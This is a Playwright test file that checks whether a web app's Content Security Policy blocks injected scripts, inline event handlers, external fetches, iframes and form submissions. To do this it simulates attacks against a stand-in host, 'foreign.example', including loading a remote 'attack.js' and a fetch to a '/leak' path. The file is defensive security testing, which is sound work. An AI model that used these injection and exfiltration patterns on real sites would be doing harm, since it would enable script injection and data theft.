/// <reference lib="dom" />
import { expect, test } from '@playwright/test';

// Page evaluation is privileged; inserted DOM resources still undergo the real browser CSP.
test('CSP blocks injected scripts, event handlers, external connections, forms and frames', async ({
  page,
}) => {
  await page.addInitScript(() => {
    const violations: string[] = [];
    (globalThis as { cspViolations?: string[] }).cspViolations = violations;
    document.addEventListener('securitypolicyviolation', (event) => {
      violations.push(event.effectiveDirective);
    });
  });
  const response = await page.goto('/');
  expect(response?.headers()['content-security-policy']).toContain("script-src 'self'");
  await expect(page.getByRole('button', { name: 'Settings', exact: true })).toBeVisible();
  const baseline = await page.evaluate(
    () => (globalThis as { cspViolations?: string[] }).cspViolations,
  );
  expect(baseline).toEqual([]);
  let externalRequests = 0;
  await page.route('https://foreign.example/**', async (route) => {
    externalRequests++;
    await route.fulfill({ contentType: 'application/javascript', body: 'window.injected = true' });
  });
  await page.evaluate(() => {
    const inline = document.createElement('script');
    inline.textContent = 'window.injected = true';
    document.body.append(inline);
    const external = document.createElement('script');
    external.src = 'https://foreign.example/attack.js';
    document.body.append(external);
    const button = document.createElement('button');
    button.setAttribute('onclick', 'window.injected = true');
    document.body.append(button);
    button.click();
    void fetch('https://foreign.example/leak').catch(() => undefined);
    const frame = document.createElement('iframe');
    frame.name = 'blocked-form-target';
    frame.src = 'https://foreign.example/frame';
    document.body.append(frame);
    const form = document.createElement('form');
    form.action = 'https://foreign.example/submit';
    form.method = 'POST';
    // Target a child frame: a CSP-blocked main-frame submit leaves Chromium navigation pending.
    form.target = 'blocked-form-target';
    document.body.append(form);
    try {
      form.submit();
    } catch {
      // Firefox enforces form-action by throwing here (and still reports the violation).
    }
  });
  await expect
    .poll(async () =>
      page.evaluate(() => (globalThis as { cspViolations?: string[] }).cspViolations),
    )
    .toEqual(
      expect.arrayContaining([
        'script-src-elem',
        'script-src-attr',
        'connect-src',
        'frame-src',
        'form-action',
      ]),
    );
  expect(
    await page.evaluate(() => (globalThis as { injected?: boolean }).injected),
  ).toBeUndefined();
  expect(externalRequests).toBe(0);
  await expect(page.getByRole('button', { name: 'Settings', exact: true })).toBeVisible();
});
